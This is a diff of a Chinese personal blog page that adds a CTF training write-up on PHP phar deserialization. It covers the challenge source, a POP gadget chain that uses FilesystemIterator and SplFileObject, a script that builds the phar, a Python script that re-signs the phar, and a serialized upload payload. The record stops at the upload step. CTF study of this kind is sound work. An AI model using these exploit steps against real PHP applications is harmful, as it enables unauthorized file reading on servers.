@@ -18,17 +18,27 @@
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
     
-        <meta name="description" content="阿巴阿巴">
+        <meta name="description" content="week3-4（4）PharPOPphar反序列化phar文件本质上是一种压缩文件，以序列化形式储存，遇到某些函数结合phar:&#x2F;&#x2F;伪协议会自动进行反序列化操作。（例如 file_put_contents、file_get_contents） phar反序列化攻击实质还是一样的，只不过phar文件为我们提供了一种过渡，即使没有unserialize()也有机会进行反序列化攻击">
 <meta property="og:type" content="article">
 <meta property="og:title" content="training-7">
 <meta property="og:url" content="http://dawnringdong.github.io/2023/11/16/training-7/index.html">
 <meta property="og:site_name" content="dawn_r1sing">
-<meta property="og:description" content="阿巴阿巴">
+<meta property="og:description" content="week3-4（4）PharPOPphar反序列化phar文件本质上是一种压缩文件，以序列化形式储存，遇到某些函数结合phar:&#x2F;&#x2F;伪协议会自动进行反序列化操作。（例如 file_put_contents、file_get_contents） phar反序列化攻击实质还是一样的，只不过phar文件为我们提供了一种过渡，即使没有unserialize()也有机会进行反序列化攻击">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202311141851790.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202311141906346.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202311141913661.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202311141756973.png">
 <meta property="article:published_time" content="2023-11-16T14:34:16.000Z">
-<meta property="article:modified_time" content="2023-11-16T14:34:16.385Z">
+<meta property="article:modified_time" content="2023-11-16T14:46:52.203Z">
 <meta property="article:author" content="dawn_r1sing">
+<meta property="article:tag" content="CTF">
+<meta property="article:tag" content="集训">
+<meta property="article:tag" content="web">
+<meta property="article:tag" content="[object Object]">
+<meta property="article:tag" content="学习">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202311141851790.png">
     
     
     <!--- Icon Part-->
@@ -299,7 +309,7 @@
                     <div class="author flex items-center">
                         <span class="name text-default-text-color text-lg font-semibold">dawn_r1sing</span>
                         
-                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv1</span>
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv2</span>
                         
                     </div>
                     <div class="meta-info">
@@ -313,20 +323,51 @@
     
         <span class="article-date article-meta-item">
             <i class="fa-regular fa-wrench"></i>&nbsp;
-            <span class="desktop">2023-11-16 22:34:16</span>
-            <span class="mobile">2023-11-16 22:34:16</span>
+            <span class="desktop">2023-11-16 22:46:52</span>
+            <span class="mobile">2023-11-16 22:46:52</span>
             <span class="hover-info">Updated</span>
         </span>
     
 
     
     
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/CTF/">CTF</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E9%9B%86%E8%AE%AD/">集训</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/web/">web</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/object-Object/">[object Object]</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E5%AD%A6%E4%B9%A0/">学习</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
 
     
     
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>1.7k Words</span>
+        </span>
+    
     
         <span class="article-min2read article-meta-item">
-            <i class="fa-regular fa-clock"></i>&nbsp;<span>1 Mins</span>
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>8 Mins</span>
         </span>
     
     
@@ -345,7 +386,97 @@
 
 
         <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
-            
+            <h1 id="week3-4（4）"><a href="#week3-4（4）" class="headerlink" title="week3-4（4）"></a>week3-4（4）</h1><h3 id="PharPOP"><a href="#PharPOP" class="headerlink" title="PharPOP"></a>PharPOP</h3><h5 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h5><p>phar文件本质上是一种压缩文件，以序列化形式储存，遇到某些函数结合phar:&#x2F;&#x2F;伪协议会自动进行反序列化操作。（例如 file_put_contents、file_get_contents）</p>
+<p>phar反序列化攻击实质还是一样的，只不过phar文件为我们提供了一种过渡，即使没有unserialize()也有机会进行反序列化攻击</p>
+<p>源代码：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$data</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">is_array</span>(<span class="variable">$data</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Cannot transfer arrays&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/get|air|tree|apple|banana|php|filter|base64|rot13|read|data/i&#x27;</span>, <span class="variable">$data</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;You can&#x27;t do&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p-&gt;act;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$p</span>(<span class="variable">$value</span>);	<span class="comment">//函数！</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$arg</span>[<span class="number">1</span>] =<span class="variable language_">$this</span>-&gt;name-&gt;<span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xxx-&gt;<span class="variable">$flag</span> = <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;w&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;It is file&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;You can look at the others&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">banana</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// flag in /</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]) &lt; <span class="number">55</span>) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;str too long&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;start&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>D中<code>file_put_contents()</code>能进行文件上传操作，之后输出phar文件目录 ；<code>file_get_contents</code>去访问phar文件，进而使phar文件反序列化。</p>
+<p><strong>整个题要传两个参数0&amp;1</strong></p>
+<h5 id="参数1的作用："><a href="#参数1的作用：" class="headerlink" title="参数1的作用："></a>参数1的作用：</h5><ol>
+<li>unserialize()触发__destruct()</li>
+<li>绕过throw new Error(“start”)报错（正常情况下存在它不会触发__destruct()，导致代码执行失去动力）</li>
+</ol>
+<p>（3. “赛道”选择’w’ or ‘r’）</p>
+<h5 id="参数0的作用："><a href="#参数0的作用：" class="headerlink" title="参数0的作用："></a>参数0的作用：</h5><p>​	0和D连着，作用自然是在我们和D之间“搭桥”，所以D的作用就是参数0的作用</p>
+<ol>
+<li>协助phar<strong>文件上传</strong>（得到phar文件目录）</li>
+<li>上传phar<strong>目录</strong>，执行phar文件内容（我们的链子）</li>
+</ol>
+<h5 id="步骤："><a href="#步骤：" class="headerlink" title="步骤："></a>步骤：</h5><h6 id="1、确定漏洞点"><a href="#1、确定漏洞点" class="headerlink" title="1、确定漏洞点"></a>1、确定漏洞点</h6><p>phar文件创建目的是什么？</p>
+<p>一定与flag有关</p>
+<p>有关flag题目给了一个提示<code>// flag in /</code></p>
+<p>是flag文件的<strong>目录</strong>，那我们还需要<u>文件名称</u>并<u>读取文件</u></p>
+<p>之后注意air里的这句：</p>
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$p</span>(<span class="variable">$value</span>);</span><br></pre></td></tr></table></figure></div>
+
+<p>一开始我很疑惑这句话，怎么看怎么觉得奇怪</p>
+<p>之后试着单独把air类拿出来执行，会报错，提示类名需要是有效字符串</p>
+<p>！应该说的就是 $p不是有效字符串，那就是说给$p找个“有用的名字”</p>
+<p>看到别人的wp里给赋值了FilesystemIterator</p>
+<p>搜了一下这就是个类名，用来实现目录遍历的</p>
+<p>喔，这里是填<strong>原生类</strong>的，本题就是<strong>用原生类FilesystemIterator遍历目录获得flag<u>文件名称</u>，之后用原生类SplFileObject<u>读取文件</u></strong></p>
+<p>大大滴漏洞！</p>
+<h6 id="2、创建phar文件"><a href="#2、创建phar文件" class="headerlink" title="2、创建phar文件"></a>2、创建phar文件</h6><p>通过phar文件触发tree类的__destruct()，启动我们的链子</p>
+<p>我们先写<strong>链子</strong></p>
+<p>链子的节点是魔术方法</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">魔术方法			  [寻找魔术方法与类的依据]				属性赋值</span><br><span class="line">tree::__destruct()   [name()]</span><br><span class="line">tree::__call()		 [-&gt;$name(不可访问变量)]			$name = class apple	//banana的__get()显然没用</span><br><span class="line">apple::__get()	     [-&gt;$flag=(给不可访问变量赋值)]	  $xxx = class air</span><br><span class="line">		     										$flag = &quot;glob:///f*&quot;	//在/下找f开头文件</span><br><span class="line">air::__set()	     [-&gt;act]						p = class tree	$act = &quot;FilesystemIterator&quot;//__set()的$value是$this-&gt;flag，所以前面给$flag赋值flag目录，然后遍历</span><br><span class="line"></span><br><span class="line">//在类的方法中注意区分p（属性）与$p（新变量）</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">air</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$p</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$p</span>, <span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;p-&gt;act;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable">$p</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">tree</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$act</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">name</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$arg</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$arg</span>[<span class="number">1</span>] =<span class="variable language_">$this</span>-&gt;name-&gt;<span class="variable">$name</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">apple</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$xxx</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$flag</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;xxx-&gt;<span class="variable">$flag</span> = <span class="variable language_">$this</span>-&gt;flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/*$tree = new tree();</span></span><br><span class="line"><span class="comment">$tree-&gt;act = &quot;SplFileObject&quot;;</span></span><br><span class="line"><span class="comment">$air = new air();</span></span><br><span class="line"><span class="comment">$air-&gt;p = $tree;</span></span><br><span class="line"><span class="comment">$apple = new apple();</span></span><br><span class="line"><span class="comment">$apple-&gt;xxx = $air;</span></span><br><span class="line"><span class="comment">$apple-&gt;flag = &quot;/fflaglag&quot;;</span></span><br><span class="line"><span class="comment">$tree1 = new tree();</span></span><br><span class="line"><span class="comment">$tree1-&gt;name = $apple;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="variable">$b</span>[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$b</span>[<span class="number">0</span>]-&gt;name = <span class="keyword">new</span> <span class="title function_ invoke__">apple</span>();</span><br><span class="line"><span class="variable">$b</span>[<span class="number">0</span>]-&gt;name-&gt;xxx = <span class="keyword">new</span> <span class="title function_ invoke__">air</span>();</span><br><span class="line"><span class="variable">$b</span>[<span class="number">0</span>]-&gt;name-&gt;flag = <span class="string">&quot;glob:///f*&quot;</span>;<span class="comment">//配合glob://协议读取完整目录,/*3</span></span><br><span class="line"><span class="variable">$b</span>[<span class="number">0</span>]-&gt;name-&gt;xxx-&gt;p = <span class="keyword">new</span> <span class="title function_ invoke__">tree</span>();</span><br><span class="line"><span class="variable">$b</span>[<span class="number">0</span>]-&gt;name-&gt;xxx-&gt;p-&gt;act = <span class="string">&quot;FilesystemIterator&quot;</span>;<span class="comment">//迭代文件</span></span><br><span class="line"><span class="variable">$b</span>[<span class="number">1</span>] = <span class="number">1</span>;  <span class="comment">//$b[]为绕过异常做准备</span></span><br><span class="line"></span><br><span class="line">@<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;filename.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;filename.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;a.txt&quot;</span>,<span class="string">&quot;contents&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
+
+<p>运行生成filename.phar文件</p>
+<p>因为想要通过phar文件触发__destruct()，还需要<strong>绕过异常报错</strong></p>
+<p><strong>法一</strong>：显式销毁，当对象没有被引用时就会被销毁,所以我们可以给对象赋值NULL</p>
+<p>在参数1里加一个<strong>对象</strong>并赋值NULL（当然参数1也要先绕过报错）</p>
+<p><strong>法二</strong>：隐式销毁，在代码执行完最后一行时，所有申请的内存都要释放掉</p>
+<p>强制让GC垃圾回收机制回收对象内存：<strong>需要反序列化一个数组，然后再利用第一个索引，来触发GC</strong></p>
+<p><a class="link"   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_45619909/article/details/122803600" >php垃圾回收机制与反序列化 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>参数0的绕过就要用法二，将phar文件改一下索引</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://raw.githubusercontent.com/dawnrisingDong/pic_bed/main/img/202311141851790.png"
+                      alt="image-20231114185134713"
+                ></p>
+<p>因为改了索引值，原来的签名就不匹配了，再改一下签名</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha1</span><br><span class="line"></span><br><span class="line">file = <span class="built_in">open</span>(<span class="string">&quot;F:\脚本\.idea\\filename.phar&quot;</span>,<span class="string">&#x27;rb&#x27;</span>).read()</span><br><span class="line">text = file[:-<span class="number">28</span>]</span><br><span class="line">last = file[-<span class="number">8</span>:]</span><br><span class="line">newfile = text+sha1(text).digest()+last</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;filename1.phar&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(newfile)</span><br></pre></td></tr></table></figure></div>
+
+<p>得到正确的phar文件</p>
+<h6 id="3、绕过waf"><a href="#3、绕过waf" class="headerlink" title="3、绕过waf"></a>3、绕过waf</h6><p><strong>对phar文件进行压缩</strong>（zip）</p>
+<p>（与上传文件同步进行）</p>
+<h6 id="4、上传文件"><a href="#4、上传文件" class="headerlink" title="4、上传文件"></a>4、上传文件</h6><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//参数1构造</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">D</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$start</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$_POST</span>[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;w&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$filename</span> = <span class="string">&quot;/tmp/&quot;</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>()).<span class="string">&quot;.jpg&quot;</span>;</span><br><span class="line">            <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$filename</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;start == <span class="string">&#x27;r&#x27;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">waf</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="variable">$f</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$data</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;It is file&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;You can look at the others&quot;</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> D;</span><br><span class="line"><span class="variable">$a</span>-&gt;start = <span class="string">&#x27;w&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;raoguo = <span class="keyword">new</span> D;</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$b</span>;</span><br></pre></td></tr></table></figure></div>
+
+<p>上传文件（w）</p>
